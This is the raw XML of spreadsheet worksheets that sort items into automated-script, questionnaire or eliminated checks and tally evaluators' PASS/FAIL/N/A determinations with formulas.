      <c r="C24" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D24" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E24" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F24" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G24" s="11"/>
      <c r="H24" s="11"/>
      <c r="I24" s="3"/>
      <c r="J24" s="2" t="s">
        <v>225</v>
      </c>
    </row>
    <row r="25" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A25" s="5" t="s">
        <v>38</v>
      </c>
      <c r="B25" s="5" t="s">
        <v>247</v>
      </c>
      <c r="C25" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D25" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F25" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G25" s="11"/>
      <c r="H25" s="11"/>
      <c r="I25" s="3"/>
      <c r="J25" s="2" t="s">
        <v>225</v>
      </c>
    </row>
    <row r="26" spans="1:11" customFormat="1" ht="201.6">
      <c r="A26" s="2" t="s">
        <v>40</v>
      </c>
      <c r="B26" s="5" t="s">
        <v>235</v>
      </c>
      <c r="C26" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D26" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E26" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F26" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Questionnaire</v>
      </c>
      <c r="G26" s="11"/>
      <c r="H26" s="11"/>
      <c r="I26" s="3"/>
      <c r="J26" s="2"/>
      <c r="K26" s="2" t="s">
        <v>279</v>
      </c>
    </row>
    <row r="27" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A27" s="2" t="s">
        <v>43</v>
      </c>
      <c r="B27" s="5" t="s">
        <v>248</v>
      </c>
      <c r="C27" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D27" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E27" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F27" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G27" s="11"/>
      <c r="H27" s="11"/>
      <c r="I27" s="3"/>
      <c r="J27" s="2" t="s">
        <v>224</v>
      </c>
    </row>
    <row r="28" spans="1:11" s="2" customFormat="1" ht="115.2">
      <c r="A28" s="2" t="s">
        <v>59</v>
      </c>
      <c r="B28" s="5" t="s">
        <v>236</v>
      </c>
      <c r="C28" s="2" t="s">
        <v>12</v>
      </c>
      <c r="D28" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E28" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F28" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Questionnaire</v>
      </c>
      <c r="G28" s="11"/>
      <c r="H28" s="11"/>
      <c r="I28" s="3"/>
      <c r="K28" s="2" t="s">
        <v>280</v>
      </c>
    </row>
    <row r="29" spans="1:11" s="2" customFormat="1" ht="172.8">
      <c r="A29" s="2" t="s">
        <v>15</v>
      </c>
      <c r="B29" s="5" t="s">
        <v>257</v>
      </c>
      <c r="C29" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D29" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E29" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F29" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G29" s="11"/>
      <c r="H29" s="11"/>
      <c r="I29" s="3" t="s">
        <v>267</v>
      </c>
      <c r="K29" s="2" t="s">
        <v>281</v>
      </c>
    </row>
    <row r="30" spans="1:11" s="2" customFormat="1" ht="158.4">
      <c r="A30" s="2" t="s">
        <v>23</v>
      </c>
      <c r="B30" s="5" t="s">
        <v>256</v>
      </c>
      <c r="C30" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D30" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E30" s="2" t="s">
        <v>211</v>
      </c>
      <c r="F30" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G30" s="11"/>
      <c r="H30" s="11"/>
      <c r="I30" s="3"/>
      <c r="K30" s="2" t="s">
        <v>283</v>
      </c>
    </row>
    <row r="31" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A31" s="5" t="s">
        <v>44</v>
      </c>
      <c r="B31" s="5" t="s">
        <v>255</v>
      </c>
      <c r="C31" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D31" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E31" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F31" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G31" s="11"/>
      <c r="H31" s="11"/>
      <c r="I31" s="3"/>
      <c r="J31" s="2" t="s">
        <v>225</v>
      </c>
    </row>
    <row r="32" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A32" s="5" t="s">
        <v>62</v>
      </c>
      <c r="B32" s="5" t="s">
        <v>254</v>
      </c>
      <c r="C32" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D32" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E32" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F32" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G32" s="11"/>
      <c r="H32" s="11"/>
      <c r="I32" s="3"/>
      <c r="J32" s="2" t="s">
        <v>225</v>
      </c>
    </row>
    <row r="33" spans="1:11" customFormat="1" ht="86.4">
      <c r="A33" s="5" t="s">
        <v>63</v>
      </c>
      <c r="B33" s="5" t="s">
        <v>253</v>
      </c>
      <c r="C33" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D33" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E33" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F33" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G33" s="11"/>
      <c r="H33" s="11"/>
      <c r="I33" s="3"/>
      <c r="J33" s="2" t="s">
        <v>234</v>
      </c>
      <c r="K33" s="2"/>
    </row>
    <row r="34" spans="1:11" s="2" customFormat="1" ht="43.2">
      <c r="A34" s="5" t="s">
        <v>45</v>
      </c>
      <c r="B34" s="5" t="s">
        <v>252</v>
      </c>
      <c r="C34" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D34" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E34" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F34" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G34" s="11"/>
      <c r="H34" s="11"/>
      <c r="I34" s="3"/>
      <c r="J34" s="2" t="s">
        <v>224</v>
      </c>
    </row>
    <row r="35" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A35" s="2" t="s">
        <v>25</v>
      </c>
      <c r="B35" s="5" t="s">
        <v>251</v>
      </c>
      <c r="C35" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D35" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E35" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F35" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G35" s="11"/>
      <c r="H35" s="11"/>
      <c r="I35" s="3" t="s">
        <v>268</v>
      </c>
      <c r="K35" s="2" t="s">
        <v>282</v>
      </c>
    </row>
    <row r="36" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A36" s="5" t="s">
        <v>26</v>
      </c>
      <c r="B36" s="5" t="s">
        <v>250</v>
      </c>
      <c r="C36" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D36" s="2" t="s">
        <v>6</v>
      </c>
      <c r="E36" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F36" s="34" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G36" s="11"/>
      <c r="H36" s="11"/>
      <c r="I36" s="3"/>
      <c r="J36" s="2" t="s">
        <v>214</v>
      </c>
    </row>
    <row r="37" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A37" s="2" t="s">
        <v>215</v>
      </c>
      <c r="B37" s="5" t="s">
        <v>249</v>
      </c>
      <c r="C37" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D37" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E37" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F37" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G37" s="11"/>
      <c r="H37" s="11"/>
      <c r="I37" s="3" t="s">
        <v>269</v>
      </c>
      <c r="K37" s="2" t="s">
        <v>282</v>
      </c>
    </row>
    <row r="38" spans="1:11" s="2" customFormat="1" ht="28.8">
      <c r="A38" s="2" t="s">
        <v>17</v>
      </c>
      <c r="B38" s="5" t="s">
        <v>16</v>
      </c>
      <c r="C38" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D38" s="2" t="s">
        <v>211</v>
      </c>
      <c r="E38" s="2" t="s">
        <v>212</v>
      </c>
      <c r="F38" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Automated Script</v>
      </c>
      <c r="G38" s="11"/>
      <c r="H38" s="11"/>
      <c r="I38" s="3" t="s">
        <v>270</v>
      </c>
      <c r="K38" s="2" t="s">
        <v>282</v>
      </c>
    </row>
    <row r="39" spans="1:11" customFormat="1" ht="28.8">
      <c r="A39" s="2" t="s">
        <v>61</v>
      </c>
      <c r="B39" s="5" t="s">
        <v>60</v>
      </c>
      <c r="C39" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D39" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E39" s="2" t="s">
        <v>28</v>
      </c>
      <c r="F39" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Questionnaire</v>
      </c>
      <c r="G39" s="11"/>
      <c r="H39" s="11"/>
      <c r="I39" s="3"/>
      <c r="J39" s="2"/>
      <c r="K39" s="2" t="s">
        <v>282</v>
      </c>
    </row>
    <row r="40" spans="1:11" s="2" customFormat="1" ht="72">
      <c r="A40" s="2" t="s">
        <v>19</v>
      </c>
      <c r="B40" s="5" t="s">
        <v>18</v>
      </c>
      <c r="C40" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D40" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E40" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F40" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G40" s="11"/>
      <c r="H40" s="11"/>
      <c r="I40" s="3"/>
      <c r="J40" s="2" t="s">
        <v>233</v>
      </c>
    </row>
    <row r="41" spans="1:11" s="2" customFormat="1" ht="72">
      <c r="A41" s="2" t="s">
        <v>21</v>
      </c>
      <c r="B41" s="5" t="s">
        <v>20</v>
      </c>
      <c r="C41" s="2" t="s">
        <v>14</v>
      </c>
      <c r="D41" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E41" s="2" t="s">
        <v>6</v>
      </c>
      <c r="F41" s="3" t="str">
        <f t="shared" si="1"/>
        <v>Eliminated</v>
      </c>
      <c r="G41" s="11"/>
      <c r="H41" s="11"/>
      <c r="I41" s="3"/>
      <c r="J41" s="2" t="s">
        <v>233</v>
      </c>
    </row>
    <row r="42" spans="1:11">
      <c r="A42"/>
      <c r="B42"/>
      <c r="C42"/>
      <c r="D42"/>
      <c r="E42"/>
      <c r="F42"/>
      <c r="H42"/>
      <c r="I42"/>
    </row>
    <row r="43" spans="1:11">
      <c r="A43"/>
      <c r="B43"/>
      <c r="C43"/>
      <c r="D43"/>
      <c r="E43"/>
      <c r="F43"/>
      <c r="H43"/>
      <c r="I43"/>
    </row>
    <row r="44" spans="1:11">
      <c r="A44"/>
      <c r="B44"/>
      <c r="C44"/>
      <c r="D44"/>
      <c r="E44"/>
      <c r="F44"/>
      <c r="H44"/>
      <c r="I44"/>
    </row>
    <row r="45" spans="1:11">
      <c r="A45"/>
      <c r="B45"/>
      <c r="C45"/>
      <c r="D45"/>
      <c r="E45"/>
      <c r="F45"/>
      <c r="H45"/>
      <c r="I45"/>
    </row>
    <row r="46" spans="1:11">
      <c r="A46"/>
      <c r="B46"/>
      <c r="C46"/>
      <c r="D46"/>
      <c r="E46"/>
      <c r="F46"/>
      <c r="H46"/>
      <c r="I46"/>
    </row>
    <row r="47" spans="1:11">
      <c r="A47"/>
      <c r="B47"/>
      <c r="C47"/>
      <c r="D47"/>
      <c r="E47"/>
      <c r="F47"/>
      <c r="H47"/>
      <c r="I47"/>
    </row>
    <row r="48" spans="1:11">
      <c r="A48"/>
      <c r="B48"/>
      <c r="C48"/>
      <c r="D48"/>
      <c r="E48"/>
      <c r="F48"/>
      <c r="H48"/>
      <c r="I48"/>
    </row>
    <row r="49" spans="1:9">
      <c r="A49"/>
      <c r="B49"/>
      <c r="C49"/>
      <c r="D49"/>
      <c r="E49"/>
      <c r="F49"/>
      <c r="H49"/>
      <c r="I49"/>
    </row>
    <row r="50" spans="1:9">
      <c r="A50"/>
      <c r="B50"/>
      <c r="C50"/>
      <c r="D50"/>
      <c r="E50"/>
      <c r="F50"/>
      <c r="H50"/>
      <c r="I50"/>
    </row>
    <row r="51" spans="1:9">
      <c r="A51"/>
      <c r="B51"/>
      <c r="C51"/>
      <c r="D51"/>
      <c r="E51"/>
      <c r="F51"/>
      <c r="H51"/>
      <c r="I51"/>
    </row>
    <row r="52" spans="1:9">
      <c r="A52"/>
      <c r="B52"/>
      <c r="C52"/>
      <c r="D52"/>
      <c r="E52"/>
      <c r="F52"/>
      <c r="H52"/>
      <c r="I52"/>
    </row>
    <row r="53" spans="1:9">
      <c r="A53"/>
      <c r="B53"/>
      <c r="C53"/>
      <c r="D53"/>
      <c r="E53"/>
      <c r="F53"/>
      <c r="H53"/>
      <c r="I53"/>
    </row>
    <row r="54" spans="1:9">
      <c r="A54"/>
      <c r="B54"/>
      <c r="C54"/>
      <c r="D54"/>
      <c r="E54"/>
      <c r="F54"/>
      <c r="H54"/>
      <c r="I54"/>
    </row>
    <row r="55" spans="1:9">
      <c r="A55"/>
      <c r="B55"/>
      <c r="C55"/>
      <c r="D55"/>
      <c r="E55"/>
      <c r="F55"/>
      <c r="H55"/>
      <c r="I55"/>
    </row>
    <row r="56" spans="1:9">
      <c r="A56"/>
      <c r="B56"/>
      <c r="C56"/>
      <c r="D56"/>
      <c r="E56"/>
      <c r="F56"/>
      <c r="H56"/>
      <c r="I56"/>
    </row>
    <row r="57" spans="1:9">
      <c r="A57"/>
      <c r="B57"/>
      <c r="C57"/>
      <c r="D57"/>
      <c r="E57"/>
      <c r="F57"/>
      <c r="H57"/>
      <c r="I57"/>
    </row>
    <row r="58" spans="1:9">
      <c r="A58"/>
      <c r="B58"/>
      <c r="C58"/>
      <c r="D58"/>
      <c r="E58"/>
      <c r="F58"/>
      <c r="H58"/>
      <c r="I58"/>
    </row>
    <row r="59" spans="1:9">
      <c r="A59"/>
      <c r="B59"/>
      <c r="C59"/>
      <c r="D59"/>
      <c r="E59"/>
      <c r="F59"/>
      <c r="H59"/>
      <c r="I59"/>
    </row>
    <row r="60" spans="1:9">
      <c r="A60"/>
      <c r="B60"/>
      <c r="C60"/>
      <c r="D60"/>
      <c r="E60"/>
      <c r="F60"/>
      <c r="H60"/>
      <c r="I60"/>
    </row>
    <row r="61" spans="1:9">
      <c r="A61"/>
      <c r="B61"/>
      <c r="C61"/>
      <c r="D61"/>
      <c r="E61"/>
      <c r="F61"/>
      <c r="H61"/>
      <c r="I61"/>
    </row>
    <row r="62" spans="1:9">
      <c r="A62"/>
      <c r="B62"/>
      <c r="C62"/>
      <c r="D62"/>
      <c r="E62"/>
      <c r="F62"/>
      <c r="H62"/>
      <c r="I62"/>
    </row>
    <row r="63" spans="1:9" ht="18">
      <c r="C63" s="6"/>
    </row>
    <row r="64" spans="1:9" ht="18">
      <c r="C64" s="6"/>
    </row>
    <row r="65" spans="3:3" ht="18">
      <c r="C65" s="6"/>
    </row>
    <row r="66" spans="3:3" ht="18">
      <c r="C66" s="6"/>
    </row>
    <row r="67" spans="3:3" ht="18">
      <c r="C67" s="6"/>
    </row>
    <row r="68" spans="3:3" ht="18">
      <c r="C68" s="6"/>
    </row>
    <row r="69" spans="3:3" ht="18">
      <c r="C69" s="6"/>
    </row>
  </sheetData>
  <phoneticPr fontId="18" type="noConversion"/>
  <conditionalFormatting sqref="F2:F41">
    <cfRule type="iconSet" priority="1">
      <iconSet iconSet="3Symbols">
        <cfvo type="percent" val="0"/>
        <cfvo type="percent" val="33"/>
        <cfvo type="percent" val="67"/>
      </iconSet>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="F2:I41">
    <cfRule type="containsText" dxfId="2" priority="2" operator="containsText" text="Automated Script">
      <formula>NOT(ISERROR(SEARCH("Automated Script",F2)))</formula>
    </cfRule>
    <cfRule type="containsText" dxfId="1" priority="3" operator="containsText" text="Questionnaire">
      <formula>NOT(ISERROR(SEARCH("Questionnaire",F2)))</formula>
    </cfRule>
    <cfRule type="containsText" dxfId="0" priority="4" operator="containsText" text="Eliminated">
      <formula>NOT(ISERROR(SEARCH("Eliminated",F2)))</formula>
    </cfRule>
  </conditionalFormatting>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D71A4-3424-9448-A574-3CC1C1E15F18}">
  <dimension ref="A1:H10"/>
  <sheetViews>
    <sheetView topLeftCell="A8" workbookViewId="0">
      <selection activeCell="J5" sqref="J5"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="11.44140625" defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="6.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="27.109375" style="1" customWidth="1"/>
    <col min="4" max="4" width="8.44140625" style="1" customWidth="1"/>
    <col min="5" max="5" width="29.44140625" style="1" customWidth="1"/>
    <col min="6" max="6" width="28.44140625" style="1" customWidth="1"/>
    <col min="7" max="7" width="33.33203125" style="1" customWidth="1"/>
    <col min="8" max="8" width="15.109375" style="1" customWidth="1"/>
    <col min="9" max="16384" width="11.44140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" ht="28.8">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="1" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="1" t="s">
        <v>288</v>
      </c>
      <c r="E1" s="1" t="s">
        <v>76</v>
      </c>
      <c r="F1" s="1" t="s">
        <v>68</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>78</v>
      </c>
      <c r="H1" s="12" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="2" spans="1:8" ht="138.9" customHeight="1">
      <c r="A2" s="1" t="s">
        <v>4</v>
      </c>
      <c r="B2" s="4">
        <v>1.2</v>
      </c>
      <c r="C2" s="1" t="s">
        <v>47</v>
      </c>
      <c r="D2" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E2" s="1" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="3" spans="1:8" ht="57.6">
      <c r="A3" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B3" s="4">
        <v>2.1</v>
      </c>
      <c r="C3" s="1" t="s">
        <v>31</v>
      </c>
      <c r="D3" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>32</v>
      </c>
    </row>
    <row r="4" spans="1:8" ht="187.2">
      <c r="A4" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B4" s="4">
        <v>2.2000000000000002</v>
      </c>
      <c r="C4" s="1" t="s">
        <v>33</v>
      </c>
      <c r="D4" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="5" spans="1:8" ht="187.2">
      <c r="A5" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B5" s="4">
        <v>2.2999999999999998</v>
      </c>
      <c r="C5" s="1" t="s">
        <v>34</v>
      </c>
      <c r="D5" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E5" s="1" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="6" spans="1:8" ht="129.6">
      <c r="A6" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B6" s="4">
        <v>2.4</v>
      </c>
      <c r="C6" s="1" t="s">
        <v>11</v>
      </c>
      <c r="D6" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E6" s="1" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="7" spans="1:8" ht="158.4">
      <c r="A7" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B7" s="4">
        <v>2.5</v>
      </c>
      <c r="C7" s="1" t="s">
        <v>56</v>
      </c>
      <c r="D7" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E7" s="2" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="8" spans="1:8" ht="115.2">
      <c r="A8" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B8" s="4" t="s">
        <v>235</v>
      </c>
      <c r="C8" s="1" t="s">
        <v>40</v>
      </c>
      <c r="D8" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E8" s="1" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="9" spans="1:8" ht="86.4">
      <c r="A9" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B9" s="4" t="s">
        <v>236</v>
      </c>
      <c r="C9" s="1" t="s">
        <v>59</v>
      </c>
      <c r="D9" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E9" s="1" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="10" spans="1:8" ht="86.4">
      <c r="A10" s="1" t="s">
        <v>14</v>
      </c>
      <c r="B10" s="4" t="s">
        <v>60</v>
      </c>
      <c r="C10" s="1" t="s">
        <v>61</v>
      </c>
      <c r="D10" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E10" s="1" t="s">
        <v>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F356A-7BF7-1E4F-AE6D-48FA0AA0F899}">
  <dimension ref="A1:Q26"/>
  <sheetViews>
    <sheetView topLeftCell="A3" zoomScale="88" workbookViewId="0">
      <selection activeCell="L21" sqref="L21"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="11.44140625" defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="14.44140625" style="1" customWidth="1"/>
    <col min="2" max="2" width="6.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="37.33203125" style="1" customWidth="1"/>
    <col min="4" max="4" width="10.6640625" style="1" customWidth="1"/>
    <col min="5" max="5" width="49.6640625" style="1" customWidth="1"/>
    <col min="6" max="7" width="12.33203125" style="1" customWidth="1"/>
    <col min="8" max="8" width="12.6640625" style="1" customWidth="1"/>
    <col min="9" max="9" width="12.33203125" style="1" customWidth="1"/>
    <col min="10" max="10" width="16" style="1" customWidth="1"/>
    <col min="11" max="13" width="13.109375" style="1" customWidth="1"/>
    <col min="14" max="14" width="14.44140625" style="1" customWidth="1"/>
    <col min="15" max="18" width="11.44140625" style="1"/>
    <col min="19" max="19" width="11.88671875" style="1" customWidth="1"/>
    <col min="20" max="20" width="11.44140625" style="1"/>
    <col min="21" max="21" width="5.109375" style="1" customWidth="1"/>
    <col min="22" max="22" width="12" style="1" customWidth="1"/>
    <col min="23" max="16384" width="11.44140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:17" ht="43.2">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="1" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="1" t="s">
        <v>288</v>
      </c>
      <c r="E1" s="1" t="s">
        <v>76</v>
      </c>
      <c r="F1" s="1" t="s">
        <v>323</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>324</v>
      </c>
      <c r="H1" s="12" t="s">
        <v>325</v>
      </c>
      <c r="I1" s="27" t="s">
        <v>326</v>
      </c>
      <c r="J1" s="27" t="s">
        <v>327</v>
      </c>
      <c r="K1" s="27" t="s">
        <v>314</v>
      </c>
      <c r="L1" s="27" t="s">
        <v>315</v>
      </c>
      <c r="M1" s="27" t="s">
        <v>307</v>
      </c>
      <c r="N1" s="27" t="s">
        <v>306</v>
      </c>
      <c r="O1" s="27" t="s">
        <v>308</v>
      </c>
      <c r="P1" s="27" t="s">
        <v>309</v>
      </c>
      <c r="Q1" s="27" t="s">
        <v>310</v>
      </c>
    </row>
    <row r="2" spans="1:17" ht="57.9" customHeight="1">
      <c r="A2" s="1" t="s">
        <v>4</v>
      </c>
      <c r="B2" s="4">
        <v>1.2</v>
      </c>
      <c r="C2" s="1" t="s">
        <v>47</v>
      </c>
      <c r="D2" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E2" s="1" t="s">
        <v>72</v>
      </c>
      <c r="F2" s="1" t="b">
        <f>'Manual Questionnaire 1'!F3</f>
        <v>0</v>
      </c>
      <c r="G2" s="37" t="str">
        <f>'Manual Questionnaire 2'!F3</f>
        <v>TRUE-ish</v>
      </c>
      <c r="H2" s="1" t="b">
        <f>'Manual Questionnaire 3'!F3</f>
        <v>0</v>
      </c>
      <c r="I2" s="1">
        <f>'Manual Questionnaire 4'!F3</f>
        <v>0</v>
      </c>
      <c r="J2" s="1">
        <f>'Manual Questionnaire 5'!G2</f>
        <v>0</v>
      </c>
      <c r="K2" s="1" cm="1">
        <f t="array" ref="K2">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>1</v>
      </c>
      <c r="L2" s="1" cm="1">
        <f t="array" ref="L2">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="M2" s="38">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>0</v>
      </c>
      <c r="N2" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>3</v>
      </c>
      <c r="O2" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="P2" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.66666666666666663</v>
      </c>
      <c r="Q2" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:17" ht="45.9" customHeight="1">
      <c r="A3" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B3" s="4">
        <v>2.1</v>
      </c>
      <c r="C3" s="1" t="s">
        <v>31</v>
      </c>
      <c r="D3" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>32</v>
      </c>
      <c r="F3" s="37" t="b">
        <f>'Manual Questionnaire 1'!F7</f>
        <v>1</v>
      </c>
      <c r="G3" s="1" t="str">
        <f>'Manual Questionnaire 2'!F7</f>
        <v>TRUE-ish</v>
      </c>
      <c r="H3" s="1" t="b">
        <f>'Manual Questionnaire 3'!F7</f>
        <v>1</v>
      </c>
      <c r="I3" s="1" t="str">
        <f>'Manual Questionnaire 4'!F7</f>
        <v>yes</v>
      </c>
      <c r="J3" s="1" t="str">
        <f>'Manual Questionnaire 5'!G3</f>
        <v xml:space="preserve">PASS-ish: commands are technically LInux tools and right, but particulars don't match
</v>
      </c>
      <c r="K3" s="1" cm="1">
        <f t="array" ref="K3">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>5</v>
      </c>
      <c r="L3" s="1" cm="1">
